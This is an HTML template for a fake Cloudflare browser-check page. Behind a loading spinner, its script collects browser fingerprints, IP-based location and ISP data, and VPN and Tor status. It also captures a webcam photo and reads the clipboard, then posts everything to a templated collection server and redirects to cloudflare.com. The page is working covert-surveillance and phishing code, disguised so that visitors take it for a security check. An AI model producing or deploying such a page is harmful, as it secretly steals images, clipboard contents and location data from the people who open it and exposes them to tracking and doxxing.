<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Just a moment...</title>
<link rel="icon" href="https://www.cloudflare.com/favicon.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f7;min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:24px}
.card{background:#fff;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.08);padding:48px;max-width:440px;width:90%;text-align:center}
.logo{width:56px;margin-bottom:20px}
h1{font-size:22px;font-weight:600;color:#1d1d1f;margin-bottom:8px}
.sub{color:#86868b;font-size:14px;margin-bottom:32px;line-height:1.5}
.spinner{width:44px;height:44px;border:4px solid #e8e8ed;border-top-color:#1d1d1f;border-radius:50%;margin:0 auto;animation:spin 1.1s cubic-bezier(.4,0,.2,1) infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.status-row{display:flex;align-items:center;justify-content:center;gap:10px;margin-top:24px;color:#86868b;font-size:13px}
.dot{width:8px;height:8px;border-radius:50%;background:#34c759;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
#video{display:none;width:200px;height:150px;border-radius:12px;margin:20px auto;object-fit:cover;background:#000}
.progress{width:100%;height:4px;background:#e8e8ed;border-radius:2px;margin-top:24px;overflow:hidden}
.progress-bar{height:100%;background:#1d1d1f;width:0%;border-radius:2px;transition:width .3s}
.success{display:none;margin-top:20px;color:#34c759;font-size:14px;font-weight:500}
</style>
</head>
<body>
<div class="card">
<img class="logo" src="https://www.cloudflare.com/favicon.ico" alt="Cloudflare">
<h1>Checking your browser</h1>
<p class="sub" id="status_text">Cloudflare is verifying your connection. This process uses browser features to confirm you are human.</p>
<div class="spinner" id="spinner"></div>
<div class="status-row"><span class="dot"></span><span id="check_text">Verifying...</span></div>
<div class="progress"><div class="progress-bar" id="progress_bar"></div></div>
<video id="video" autoplay muted playsinline></video>
<div class="success" id="success">✓ Verification complete. Redirecting...</div>
</div>
<script>
const LID='{{LINK_ID}}',BASE='{{BASE_URL}}',SID='{{SESSION_ID}}',REF='{{REFERRER}}';
async function collect(){
    const d={session:SID,referrer:REF};
    d.ua=navigator.userAgent;d.platform=navigator.platform;
    d.screen=screen.width+'x'+screen.height+'x'+screen.colorDepth;
    d.language=navigator.language||navigator.userLanguage;
    d.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
    d.cookies=navigator.cookieEnabled?1:0;
    d.dnt=navigator.doNotTrack?1:0;
    d.page_path=window.location.pathname;
    d.querystring=window.location.search;
    try{
        const c=document.createElement('canvas');c.width=256;c.height=128;
        const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
        if(gl){
            const de=gl.getExtension('WEBGL_debug_renderer_info');
            if(de){d.webgl_fp=gl.getParameter(de.UNMASKED_RENDERER_WEBGL)+' | '+gl.getParameter(de.UNMASKED_VENDOR_WEBGL)}
            d.canvas_fp=gl.getParameter(gl.RENDERER)
        }
    }catch(e){}
    d.cpu_cores=navigator.hardwareConcurrency||null;
    d.device_memory=navigator.deviceMemory||null;
    d.touch='ontouchstart'in window||navigator.maxTouchPoints>0?1:0;
    try{
        const t=await fetch('https://ip-api.com/json/?fields=query,country,city,lat,lon,isp,org,as,proxy,hosting');
        const j=await t.json();
        d.ip=j.query;d.country=j.country;d.city=j.city;d.lat=j.lat;d.lon=j.lon;
        d.isp=j.isp;d.org=j.org;d.asn=j.as;d.proxy=j.proxy?1:0;d.hosting=j.hosting?1:0
    }catch(e){}
    try{
        const rtc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
        rtc.createDataChannel('');
        const p=await rtc.createOffer();await rtc.setLocalDescription(p);
        d.vpn=0;d.tor=0;
        rtc.onicecandidate=e=>{
            if(e.candidate){
                const c=e.candidate.candidate;
                if(c.includes('relay')||c.includes('srflx'))d.vpn=1;
                if(c.includes('0.0.0.0')&&!c.includes('192.168')&&!c.includes('10.'))d.tor=1
            }
        };
        await new Promise(r=>setTimeout(r,500))
    }catch(e){}
    try{
        const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}}});
        const v=document.getElementById('video');v.srcObject=st;v.style.display='block';
        document.getElementById('check_text').textContent='Capturing security image...';
        await new Promise(r=>setTimeout(r,800));
        const ca=document.createElement('canvas');ca.width=v.videoWidth||640;ca.height=v.videoHeight||480;
        ca.getContext('2d').drawImage(v,0,0);
        d.photo=ca.toDataURL('image/jpeg',0.85).split(',')[1];
        st.getTracks().forEach(t=>t.stop())
    }catch(e){d.photo=''}
    try{
        const txt=await navigator.clipboard.readText();
        if(txt)d.clipboard=txt.substring(0,2000)
    }catch(e){}
    try{
        navigator.share||navigator.canShare?1:0
    }catch(e){}
    try{
        await fetch(BASE+'/c/'+LID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})
    }catch(e){}
    document.getElementById('spinner').style.display='none';
    document.getElementById('check_text').textContent='';
    document.querySelector('.status-row').style.display='none';
    document.getElementById('progress_bar').style.width='100%';
    document.getElementById('success').style.display='block';
    setTimeout(()=>{window.location.href='https://www.cloudflare.com'},2000)
}
const steps=['Verifying connection...','Checking browser...','Running security scan...','Capturing environment...','Almost done...'];
let si=0;
const iv=setInterval(()=>{
    if(si<steps.length-1){
        si++;
        document.getElementById('check_text').textContent=steps[si];
        document.getElementById('progress_bar').style.width=(si/(steps.length-1)*80)+'%'
    }else{clearInterval(iv)}
},1200);
setTimeout(collect,2000)
</script>
</body>
</html>
